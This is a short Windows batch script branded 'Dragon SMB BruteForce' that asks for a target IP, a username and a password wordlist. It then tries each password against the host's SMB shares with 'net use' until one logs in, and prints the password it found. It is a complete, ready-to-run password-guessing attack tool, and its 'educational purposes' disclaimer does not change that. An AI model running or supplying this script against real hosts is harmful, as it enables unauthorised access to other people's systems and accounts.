@echo off
echo        

CHCP 65001
cls
echo [96m v4.6
echo [94m SMB BruteForce
echo [96m Disclaimer.
echo [96m You can only use this tools for educational purposes , 
echo [96m we are not responsible for anything di with them!!!
echo [95m ═══════════════════════════════════════════════════════════════════════════════════[0m
title Dragon SMB BruteForce
echo [96m ╔════════════════════════════════════════════════════╗[0m
echo [94m ║██████╗ ██████╗  █████╗  ██████╗  ██████╗ ███╗   ██╗║[0m
echo [96m ║██╔══██╗██╔══██╗██╔══██╗██╔════╝ ██╔═══██╗████╗  ██║║[0m
echo [94m ║██║  ██║██████╔╝███████║██║  ███╗██║   ██║██╔██╗ ██║║[0m
echo [96m ║██║  ██║██╔══██╗██╔══██║██║   ██║██║   ██║██║╚██╗██║║[0m
echo [94m ║██████╔╝██║  ██║██║  ██║╚██████╔╝╚██████╔╝██║ ╚████║║[0m
echo [96m ║╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝║[0m
echo [94m ║                                                    ║[0m
echo [96m ║████████╗ ██████╗  ██████╗ ██╗     ███████╗         ║[0m
echo [94m ║╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██╔════╝         ║[0m
echo [96m ║   ██║   ██║   ██║██║   ██║██║     ███████╗         ║[0m
echo [94m ║   ██║   ██║   ██║██║   ██║██║     ╚════██║         ║[0m
echo [96m ║   ██║   ╚██████╔╝╚██████╔╝███████╗███████║         ║[0m
echo [94m ║   ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚══════╝         ║[0m
echo [96m ╚════════════════════════════════════════════════════╝[0m
echo [95m ═══════════════════════════════════════════════════════════════════════════════════[0m

set /p ip="[93m Enter the IP Adress: " 
echo [95m ═══════════════════════════════════════════════════════════════════════════════════[0m
set /p user_name="[93m Enter the Username: " 
echo [95m ═══════════════════════════════════════════════════════════════════════════════════[0m
set /p wordlist="[93m Enter the Wordlist Path: " 
echo [95m ═══════════════════════════════════════════════════════════════════════════════════[0m
for /f %%a in (%wordlist%) do (
	set pass=%%a
	call :attempt
)	
echo  Password not Found
echo  [try chosing another wordlist]
ECHO  [or verifying if the IP or User Name is correct.]
pause
exit


:success
echo  Password Found!: %pass%
pause
exit

:attempt
net use \\%ip% /user:%user_name% %pass%
echo:attempt
if %errorlevel% EQU 0 goto success